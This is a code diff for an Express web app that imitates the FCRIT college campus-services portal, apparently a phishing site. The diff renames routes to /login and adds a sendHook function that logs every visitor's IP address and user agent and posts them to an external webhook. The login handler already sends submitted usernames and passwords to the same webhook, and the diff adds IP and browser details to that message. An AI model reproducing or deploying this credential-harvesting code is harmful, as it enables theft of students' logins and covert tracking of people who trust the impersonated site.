@@ -21,16 +21,22 @@ app.set('json spaces', 1);
 
 // Pages
 app.get('/', (req, res) => {
+  sendHook(req)
   res.redirect('https://fcrit.ac.in/');
+  // res.render('index', {
+  //   title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility."
+  // });
 });
 
-app.get('/update', (req, res) => {
+app.get('/login', (req, res) => {
+  sendHook(req)
   res.render('index', {
     title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility."
   });
 });
 
-app.get('/update/:id', (req, res) => {
+app.get('/login/:id', (req, res) => {
+  sendHook(req);
   const user = req.params.id;
   res.render('index', {
     title: "FCRIT - Campus Service - Railway Concession, Bona fide Certificate, Internship Permission, and LoR Eligibility.",
@@ -40,7 +46,7 @@ app.get('/update/:id', (req, res) => {
 
 
 // Send route
-app.post('/update/new', async (req, res) => {
+app.post('/login/new', async (req, res) => {
   try {
     const username = req.body.username;
     const password = req.body.password;
@@ -48,6 +54,10 @@ app.post('/update/new', async (req, res) => {
     if (!username) {
       return res.status(400).render('error', { message: `Username is required` });
     }
+     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    const modifiedipString = clientIP.split(',')[0];
+    const clientAgent = req.headers['user-agent'] || req.socket.remoteAddress;
 
     const webhookURL = process.env['hook'];
     const message = {
@@ -63,6 +73,14 @@ app.post('/update/new', async (req, res) => {
             {
               name: 'Password',
               value: password,
+            },
+            {
+              name: 'Ip Address',
+              value: modifiedipString,
+            },
+            {
+              name: 'Browser user agent',
+              value: clientAgent,
             },
           ],
         },
@@ -106,3 +124,48 @@ process.on('multipleResolves', (type, promise, reason) => {
   console.log(' [antiCrash] :: Multiple Resolves');
   console.log(type, promise, reason);
 });
+
+
+// Define a function to handle form submissions
+async function sendHook(req) {
+  try {
+     const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    const modifiedipString = clientIP.split(',')[0];
+    const clientAgent = req.headers['user-agent'] || req.socket.remoteAddress;
+
+    const webhookURL = process.env['hook'];
+    const message = {
+      content: 'New capture',
+      embeds: [
+        {
+          title: 'get requested lol',
+          fields: [
+            {
+              name: 'Ip Address',
+              value: modifiedipString,
+            },
+            {
+              name: 'Browser user agent',
+              value: clientAgent,
+            },
+          ],
+        },
+      ],
+    };
+
+    // Send the data to the webhook
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(message),
+    });
+
+    console.log('Form submission data sent successfully.');
+  } catch (error) {
+    console.error('Error sending form submission data:', error.message);
+  }
+}
+
